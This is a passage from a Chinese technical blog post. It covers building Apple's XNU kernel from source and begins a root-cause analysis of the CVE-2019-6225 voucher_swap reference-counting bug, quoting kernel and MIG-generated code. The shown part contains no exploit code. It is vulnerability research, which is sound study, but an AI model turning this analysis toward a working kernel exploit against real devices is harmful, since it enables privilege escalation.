<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">export</span> TARBALLS=https://opensource.apple.com/tarballs</span><br><span class="line"><span class="comment"># 下载需要用到源码，对应XNU的版本</span></span><br><span class="line">curl -O <span class="variable">$&#123;TARBALLS&#125;</span>/dtrace/dtrace-284.200.15.tar.gz</span><br><span class="line">curl -O <span class="variable">$&#123;TARBALLS&#125;</span>/AvailabilityVersions/AvailabilityVersions-33.200.4.tar.gz</span><br><span class="line">curl -O <span class="variable">$&#123;TARBALLS&#125;</span>/libdispatch/libdispatch-1008.220.2.tar.gz</span><br></pre></td></tr></table></figure>

<h4 id="编译dtrace"><a href="#编译dtrace" class="headerlink" title="编译dtrace"></a>编译dtrace</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">tar xf dtrace-284.200.15.tar.gz</span><br><span class="line"><span class="built_in">cd</span> dtrace-284.200.15.tar.gz</span><br><span class="line"></span><br><span class="line">xcodebuild install -sdk macosx -target ctfconvert \</span><br><span class="line">-target ctfdump -target ctfmerge \</span><br><span class="line">ARCHS=<span class="string">&#x27;x86_64 arm64&#x27;</span> VALID_ARCHS=<span class="string">&#x27;x86_64 arm64&#x27;</span> DSTROOT=<span class="variable">$PWD</span>/dst</span><br><span class="line"></span><br><span class="line"><span class="built_in">export</span> TOOLCHAIN=`<span class="built_in">cd</span> $(xcrun -sdk macosx -show-sdk-platform-path)/../../Toolchains/XcodeDefault.xctoolchain &amp;&amp; <span class="built_in">pwd</span>`</span><br><span class="line"><span class="built_in">sudo</span> ditto <span class="string">&quot;<span class="variable">$PWD</span>/dst/<span class="variable">$TOOLCHAIN</span>&quot;</span> <span class="string">&quot;<span class="variable">$TOOLCHAIN</span>&quot;</span></span><br></pre></td></tr></table></figure>

<h5 id="编译错误"><a href="#编译错误" class="headerlink" title="编译错误"></a>编译错误</h5><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">error: <span class="string">&#x27;elf.h&#x27;</span> file not found with &lt;angled&gt; include; use <span class="string">&quot;quotes&quot;</span> instead</span><br></pre></td></tr></table></figure>

<p>没找到解决方案</p>
<h4 id="编译AvailabilityVersions"><a href="#编译AvailabilityVersions" class="headerlink" title="编译AvailabilityVersions"></a>编译AvailabilityVersions</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">tar zxf AvailabilityVersions-33.200.4.tar.gz</span><br><span class="line"><span class="built_in">cd</span> AvailabilityVersions-33.200.4</span><br><span class="line">make install</span><br><span class="line"><span class="built_in">sudo</span> ditto <span class="string">&quot;<span class="variable">$PWD</span>/dst/usr/local/libexec&quot;</span> \</span><br><span class="line"><span class="string">&quot;<span class="subst">$(xcrun -sdk macosx -show-sdk-path)</span>/usr/local/libexec&quot;</span></span><br></pre></td></tr></table></figure>

<h4 id="编译libdispatch"><a href="#编译libdispatch" class="headerlink" title="编译libdispatch"></a>编译libdispatch</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">cd</span> libdispatch-1008.220.2</span><br><span class="line">xcodebuild install -sdk macosx ARCHS=<span class="string">&#x27;x86_64 arm64e&#x27;</span> \</span><br><span class="line">VALID_ARCHS=<span class="string">&#x27;x86_64 arm64e&#x27;</span> -target libfirehose_kernel \</span><br><span class="line">PRODUCT_NAME=firehose_kernel DSTROOT=<span class="variable">$PWD</span>/dst</span><br><span class="line"><span class="built_in">sudo</span> ditto <span class="string">&quot;<span class="variable">$PWD</span>/dst/usr/local&quot;</span> \</span><br><span class="line"><span class="string">&quot;<span class="subst">$(xcrun -sdk macosx -show-sdk-path)</span>/usr/local&quot;</span></span><br></pre></td></tr></table></figure>

<h4 id="编译内核"><a href="#编译内核" class="headerlink" title="编译内核"></a>编译内核</h4><p>安装XNU头文件，依赖于前面的编译结果</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">cd</span> xnu-4903.221.2</span><br><span class="line">make SDKROOT=macosx ARCH_CONFIGS=<span class="string">&quot;X86_64 ARM64&quot;</span> installhdrs</span><br><span class="line"><span class="built_in">sudo</span> ditto <span class="string">&quot;<span class="variable">$PWD</span>/BUILD/dst&quot;</span> <span class="string">&quot;<span class="subst">$(xcrun -sdk macosx -show-sdk-path)</span>&quot;</span></span><br></pre></td></tr></table></figure>

<p>内核编译可以基于<code>KERNEL_CONFIGS</code>&amp;<code>ARCH_CONFIGS</code>变量作为参数构建内核：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">make SDKROOT=&lt;sdkroot&gt; ARCH_CONFIGS=&lt;arch&gt; KERNEL_CONFIGS=&lt;variant&gt;</span><br></pre></td></tr></table></figure>

<p>参数解释：</p>
<ul>
<li><code>&lt;sdkroot&gt;</code>：磁盘上 MacOS SDK 的路径（默认为<code>/</code>）。</li>
<li><code>&lt;variant&gt;</code>: 可以是<code>debug</code>, <code>development</code>, <code>release</code>,<code>profile</code>并在整个内核代码中配置编译标志和断言。</li>
<li><code>&lt;arch&gt;</code>：编译架构。（例如<code>i386</code>或<code>X86_64</code>）</li>
</ul>
<p>一些编译示例：</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$ make SDKROOT=macosx.internal ARCH_CONFIGS=X86_64 KERNEL_CONFIGS=DEVELOPMENT</span><br><span class="line">$ make SDKROOT=macosx.internal ARCH_CONFIGS=X86_64 KERNEL_CONFIGS=<span class="string">&quot;RELEASE DEVELOPMENT DEBUG&quot;</span></span><br></pre></td></tr></table></figure>

<p>直接<code>make</code>表示架构设置为本地架构，默认内核配置为<code>development</code>。</p>
<p>编译没成功，不知道是不是SDK不匹配的原因。</p>
<h1 id="voucher-sawp漏洞的发现"><a href="#voucher-sawp漏洞的发现" class="headerlink" title="voucher_sawp漏洞的发现"></a>voucher_sawp漏洞的发现</h1><p>漏洞编号为CVE-2019-6225，存在漏洞的xnu内核代码为<a target="_blank" rel="noopener" href="https://opensource.apple.com/tarballs/xnu/xnu-4903.221.2.tar.gz">xnu-4903.221.2</a>。漏洞出现在task_swap_mach_voucher()函数中，主要是MIG生成代码导致的引用计数问题。创建或复制对象会将其引用计数加1，而销毁或覆盖对象会将其引用计数减1。如果对象的引用计数达到零，则将释放该对象。在内存有限的系统中，引用计数比垃圾回收(它是循环发生的，可能会耗费时间)更有效，因为可以在对象的引用计数为零时立即释放对象，从而提高了系统的整体响应能力。</p>
<h2 id="漏洞原因"><a href="#漏洞原因" class="headerlink" title="漏洞原因"></a>漏洞原因</h2><p>问题出现在<code>task_swap_mach_voucher()</code>（<code>osfmk/kern/task.c</code>）中，功能就是用新的voucher替换旧的voucher：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* Placeholders for the task set/get voucher interfaces */</span></span><br><span class="line">......</span><br><span class="line"><span class="type">kern_return_t</span></span><br><span class="line"><span class="title function_">task_swap_mach_voucher</span><span class="params">(</span></span><br><span class="line"><span class="params">	<span class="type">task_t</span>			task,</span></span><br><span class="line"><span class="params">	<span class="type">ipc_voucher_t</span>		new_voucher,</span></span><br><span class="line"><span class="params">	<span class="type">ipc_voucher_t</span>		*in_out_old_voucher)</span></span><br><span class="line">&#123;</span><br><span class="line">	<span class="keyword">if</span> (TASK_NULL == task)</span><br><span class="line">		<span class="keyword">return</span> KERN_INVALID_TASK;</span><br><span class="line"></span><br><span class="line">	*in_out_old_voucher = new_voucher;</span><br><span class="line">	<span class="keyword">return</span> KERN_SUCCESS;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>根据注释信息可知，<code>task_swap_mach_voucher</code>函数是一个占位符。可在<code>osfmk/mach/task.defs</code>中找到它：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">routine <span class="title function_">task_swap_mach_voucher</span><span class="params">(</span></span><br><span class="line"><span class="params">		task		: <span class="type">task_t</span>;</span></span><br><span class="line"><span class="params">		new_voucher	: <span class="type">ipc_voucher_t</span>;</span></span><br><span class="line"><span class="params">	inout	old_voucher	: <span class="type">ipc_voucher_t</span>)</span>;</span><br></pre></td></tr></table></figure>

<p>这意味着它实际上是Mach API，因为MIG def文件为Mach接口生成代码。<code>/BUILD/obj/RELEASE_X86_64/osfmk/mach/task.h</code>中可以找到此函数的Mach消息格式：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">ifdef</span>  __MigPackStructs</span></span><br><span class="line"><span class="meta">#<span class="keyword">pragma</span> pack(push, 4)</span></span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line">	<span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> &#123;</span></span><br><span class="line">		<span class="type">mach_msg_header_t</span> Head;</span><br><span class="line">		<span class="comment">/* start of the kernel processed data */</span></span><br><span class="line">		<span class="type">mach_msg_body_t</span> msgh_body;</span><br><span class="line">		<span class="type">mach_msg_port_descriptor_t</span> old_voucher;</span><br><span class="line">		<span class="comment">/* end of the kernel processed data */</span></span><br><span class="line">	&#125; __Reply__task_swap_mach_voucher_t __attribute__((unused));</span><br><span class="line"><span class="meta">#<span class="keyword">ifdef</span>  __MigPackStructs</span></span><br><span class="line"><span class="meta">#<span class="keyword">pragma</span> pack(pop)</span></span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br></pre></td></tr></table></figure>

<p><code>/BUILD/obj/RELEASE_X86_64/osfmk/RELEASE/mach/task_server.c</code>中可以看到对请求执行的检查：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">mig_internal <span class="type">kern_return_t</span> __MIG_check__Request__task_swap_mach_voucher_t(__attribute__((__unused__)) __Request__task_swap_mach_voucher_t *In0P)</span><br><span class="line">&#123;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">typedef</span> __Request__task_swap_mach_voucher_t __Request;</span><br><span class="line"><span class="meta">#<span class="keyword">if</span>	__MigTypeCheck</span></span><br><span class="line">	<span class="keyword">if</span> (!(In0P-&gt;Head.msgh_bits &amp; MACH_MSGH_BITS_COMPLEX) ||</span><br><span class="line">	    (In0P-&gt;msgh_body.msgh_descriptor_count != <span class="number">2</span>) ||</span><br><span class="line">	    (In0P-&gt;Head.msgh_size != (<span class="type">mach_msg_size_t</span>)<span class="keyword">sizeof</span>(__Request)))</span><br><span class="line">		<span class="keyword">return</span> MIG_BAD_ARGUMENTS;</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span>	<span class="comment">/* __MigTypeCheck */</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">if</span>	__MigTypeCheck</span></span><br><span class="line">	<span class="keyword">if</span> (In0P-&gt;new_voucher.type != MACH_MSG_PORT_DESCRIPTOR ||</span><br><span class="line">	    In0P-&gt;new_voucher.disposition != <span class="number">17</span>)</span><br><span class="line">		<span class="keyword">return</span> MIG_TYPE_ERROR;</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span>	<span class="comment">/* __MigTypeCheck */</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">if</span>	__MigTypeCheck</span></span><br><span class="line">	<span class="keyword">if</span> (In0P-&gt;old_voucher.type != MACH_MSG_PORT_DESCRIPTOR ||</span><br><span class="line">	    In0P-&gt;old_voucher.disposition != <span class="number">17</span>)</span><br><span class="line">		<span class="keyword">return</span> MIG_TYPE_ERROR;</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span>	<span class="comment">/* __MigTypeCheck */</span></span></span><br><span class="line"></span><br><span class="line">	<span class="keyword">return</span> MACH_MSG_SUCCESS;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>实际实现：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* Routine task_swap_mach_voucher */</span></span><br><span class="line">mig_internal novalue _Xtask_swap_mach_voucher</span><br><span class="line">	(<span class="type">mach_msg_header_t</span> *InHeadP, <span class="type">mach_msg_header_t</span> *OutHeadP)</span><br><span class="line">&#123;</span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">ifdef</span>  __MigPackStructs</span></span><br><span class="line"><span class="meta">#<span class="keyword">pragma</span> pack(push, 4)</span></span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line">	<span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> &#123;</span></span><br><span class="line">		<span class="type">mach_msg_header_t</span> Head;</span><br><span class="line">		<span class="comment">/* start of the kernel processed data */</span></span><br><span class="line">		<span class="type">mach_msg_body_t</span> msgh_body;</span><br><span class="line">		<span class="type">mach_msg_port_descriptor_t</span> new_voucher;</span><br><span class="line">		<span class="type">mach_msg_port_descriptor_t</span> old_voucher;</span><br><span class="line">		<span class="comment">/* end of the kernel processed data */</span></span><br><span class="line">		<span class="type">mach_msg_trailer_t</span> trailer;</span><br><span class="line">	&#125; Request __attribute__((unused));</span><br><span class="line"><span class="meta">#<span class="keyword">ifdef</span>  __MigPackStructs</span></span><br><span class="line"><span class="meta">#<span class="keyword">pragma</span> pack(pop)</span></span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line">	<span class="keyword">typedef</span> __Request__task_swap_mach_voucher_t __Request;</span><br><span class="line">	<span class="keyword">typedef</span> __Reply__task_swap_mach_voucher_t Reply __attribute__((unused));</span><br><span class="line"></span><br><span class="line">	<span class="comment">/*</span></span><br><span class="line"><span class="comment">	 * typedef struct &#123;</span></span><br><span class="line"><span class="comment">	 * 	mach_msg_header_t Head;</span></span><br><span class="line"><span class="comment">	 * 	NDR_record_t NDR;</span></span><br><span class="line"><span class="comment">	 * 	kern_return_t RetCode;</span></span><br><span class="line"><span class="comment">	 * &#125; mig_reply_error_t;</span></span><br><span class="line"><span class="comment">	 */</span></span><br><span class="line"></span><br><span class="line">	Request *In0P = (Request *) InHeadP;</span><br><span class="line">	Reply *OutP = (Reply *) OutHeadP;</span><br><span class="line"><span class="meta">#<span class="keyword">ifdef</span>	__MIG_check__Request__task_swap_mach_voucher_t__defined</span></span><br><span class="line">	<span class="type">kern_return_t</span> check_result;</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span>	<span class="comment">/* __MIG_check__Request__task_swap_mach_voucher_t__defined */</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">if</span>	__MigKernelSpecificCode</span></span><br><span class="line"><span class="meta">#<span class="keyword">if</span>	UseStaticTemplates</span></span><br><span class="line">	<span class="type">const</span> <span class="type">static</span> <span class="type">mach_msg_port_descriptor_t</span> old_voucherTemplate = &#123;</span><br><span class="line">		<span class="comment">/* name = */</span>		MACH_PORT_NULL,</span><br><span class="line">		<span class="comment">/* pad1 = */</span>		<span class="number">0</span>,</span><br><span class="line">		<span class="comment">/* pad2 = */</span>		<span class="number">0</span>,</span><br><span class="line">		<span class="comment">/* disp = */</span>		<span class="number">17</span>,</span><br><span class="line">		<span class="comment">/* type = */</span>		MACH_MSG_PORT_DESCRIPTOR,</span><br><span class="line">	&#125;;</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span>	<span class="comment">/* UseStaticTemplates */</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">else</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">if</span>	UseStaticTemplates</span></span><br><span class="line">	<span class="type">const</span> <span class="type">static</span> <span class="type">mach_msg_port_descriptor_t</span> old_voucherTemplate = &#123;</span><br><span class="line">		<span class="comment">/* name = */</span>		MACH_PORT_NULL,</span><br><span class="line">		<span class="comment">/* pad1 = */</span>		<span class="number">0</span>,</span><br><span class="line">		<span class="comment">/* pad2 = */</span>		<span class="number">0</span>,</span><br><span class="line">		<span class="comment">/* disp = */</span>		<span class="number">19</span>,</span><br><span class="line">		<span class="comment">/* type = */</span>		MACH_MSG_PORT_DESCRIPTOR,</span><br><span class="line">	&#125;;</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span>	<span class="comment">/* UseStaticTemplates */</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">endif</span> <span class="comment">/* __MigKernelSpecificCode */</span></span></span><br><span class="line">	<span class="type">kern_return_t</span> RetCode;</span><br><span class="line">	<span class="type">task_t</span> task;</span><br><span class="line">	<span class="type">ipc_voucher_t</span> new_voucher;</span><br><span class="line">	<span class="type">ipc_voucher_t</span> old_voucher;</span><br><span class="line"></span><br><span class="line">	__DeclareRcvRpc(<span class="number">3441</span>, <span class="string">&quot;task_swap_mach_voucher&quot;</span>)</span><br><span class="line">	__BeforeRcvRpc(<span class="number">3441</span>, <span class="string">&quot;task_swap_mach_voucher&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">if</span>	defined(__MIG_check__Request__task_swap_mach_voucher_t__defined)</span></span><br><span class="line">	check_result = __MIG_check__Request__task_swap_mach_voucher_t((__Request *)In0P);</span><br><span class="line">	<span class="keyword">if</span> (check_result != MACH_MSG_SUCCESS)</span><br><span class="line">		&#123; MIG_RETURN_ERROR(OutP, check_result); &#125;</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span>	<span class="comment">/* defined(__MIG_check__Request__task_swap_mach_voucher_t__defined) */</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">if</span>	UseStaticTemplates</span></span><br><span class="line">	OutP-&gt;old_voucher = old_voucherTemplate;</span><br><span class="line"><span class="meta">#<span class="keyword">else</span>	<span class="comment">/* UseStaticTemplates */</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">if</span> __MigKernelSpecificCode</span></span><br><span class="line">	OutP-&gt;old_voucher.disposition = <span class="number">17</span>;</span><br><span class="line"><span class="meta">#<span class="keyword">else</span></span></span><br><span class="line">	OutP-&gt;old_voucher.disposition = <span class="number">19</span>;</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span> <span class="comment">/* __MigKernelSpecificCode */</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">if</span> !(defined(KERNEL) &amp;&amp; defined(__LP64__))</span></span><br><span class="line">	OutP-&gt;old_voucher.pad1 = <span class="number">0</span>;</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line">	OutP-&gt;old_voucher.pad2 = <span class="number">0</span>;</span><br><span class="line">	OutP-&gt;old_voucher.type = MACH_MSG_PORT_DESCRIPTOR;</span><br><span class="line"><span class="meta">#<span class="keyword">if</span> defined(KERNEL)</span></span><br><span class="line">	OutP-&gt;old_voucher.pad_end = <span class="number">0</span>;</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">endif</span>	<span class="comment">/* UseStaticTemplates */</span></span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">	task = convert_port_to_task(In0P-&gt;Head.msgh_request_port);</span><br><span class="line"></span><br><span class="line">	new_voucher = convert_port_to_voucher(In0P-&gt;new_voucher.name);</span><br><span class="line"></span><br><span class="line">	old_voucher = convert_port_to_voucher(In0P-&gt;old_voucher.name);</span><br><span class="line"></span><br><span class="line">	RetCode = task_swap_mach_voucher(task, new_voucher, &amp;old_voucher);</span><br><span class="line">	ipc_voucher_release(new_voucher);</span><br><span class="line">	task_deallocate(task);</span><br><span class="line">	<span class="keyword">if</span> (RetCode != KERN_SUCCESS) &#123;</span><br><span class="line">		MIG_RETURN_ERROR(OutP, RetCode);</span><br><span class="line">	&#125;</span><br><span class="line"><span class="meta">#<span class="keyword">if</span>	__MigKernelSpecificCode</span></span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span> (IP_VALID((<span class="type">ipc_port_t</span>)In0P-&gt;old_voucher.name))</span><br><span class="line">		ipc_port_release_send((<span class="type">ipc_port_t</span>)In0P-&gt;old_voucher.name);</span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span> (IP_VALID((<span class="type">ipc_port_t</span>)In0P-&gt;new_voucher.name))</span><br><span class="line">		ipc_port_release_send((<span class="type">ipc_port_t</span>)In0P-&gt;new_voucher.name);</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span> <span class="comment">/* __MigKernelSpecificCode */</span></span></span><br><span class="line">	OutP-&gt;old_voucher.name = (<span class="type">mach_port_t</span>)convert_voucher_to_port(old_voucher);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">	OutP-&gt;Head.msgh_bits |= MACH_MSGH_BITS_COMPLEX;</span><br><span class="line">	OutP-&gt;Head.msgh_size = (<span class="type">mach_msg_size_t</span>)(<span class="keyword">sizeof</span>(Reply));</span><br><span class="line">	OutP-&gt;msgh_body.msgh_descriptor_count = <span class="number">1</span>;</span><br><span class="line">	__AfterRcvRpc(<span class="number">3441</span>, <span class="string">&quot;task_swap_mach_voucher&quot;</span>)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><code>convert_port_to_voucher</code>函数通过调用<code>ipc_voucher_reference</code>函数将引用计数增加1：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> *	Routine:	convert_port_to_voucher</span></span><br><span class="line"><span class="comment"> *	Purpose:</span></span><br><span class="line"><span class="comment"> *		Convert from a port to a voucher.</span></span><br><span class="line"><span class="comment"> *		Doesn&#x27;t consume the port [send-right] ref;</span></span><br><span class="line"><span class="comment"> *		produces a voucher ref,	which may be null.</span></span><br><span class="line"><span class="comment"> *	Conditions:</span></span><br><span class="line"><span class="comment"> *		Caller has a send-right reference to port.</span></span><br><span class="line"><span class="comment"> *		Port may or may not be locked.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="type">ipc_voucher_t</span></span><br><span class="line"><span class="title function_">convert_port_to_voucher</span><span class="params">(</span></span><br><span class="line"><span class="params">	<span class="type">ipc_port_t</span>	port)</span></span><br><span class="line">&#123;</span><br><span class="line">	<span class="keyword">if</span> (IP_VALID(port)) &#123;</span><br><span class="line">		<span class="type">ipc_voucher_t</span> voucher = (<span class="type">ipc_voucher_t</span>) port-&gt;ip_kobject;</span><br><span class="line"></span><br><span class="line">		<span class="comment">/*</span></span><br><span class="line"><span class="comment">		 * No need to lock because we have a reference on the</span></span><br><span class="line"><span class="comment">		 * port, and if it is a true voucher port, that reference</span></span><br><span class="line"><span class="comment">		 * keeps the voucher bound to the port (and active).</span></span><br><span class="line"><span class="comment">		 */</span></span><br><span class="line">		<span class="keyword">if</span> (ip_kotype(port) != IKOT_VOUCHER)</span><br><span class="line">			<span class="keyword">return</span> IV_NULL;</span><br><span class="line"></span><br><span class="line">		assert(ip_active(port));</span><br><span class="line"></span><br><span class="line">		ipc_voucher_reference(voucher);</span><br><span class="line">		<span class="keyword">return</span> (voucher);</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">return</span> IV_NULL;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><code>convert_voucher_to_port</code>函数通过调用<code>ipc_voucher_release</code>函数将引用计数减少1：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span 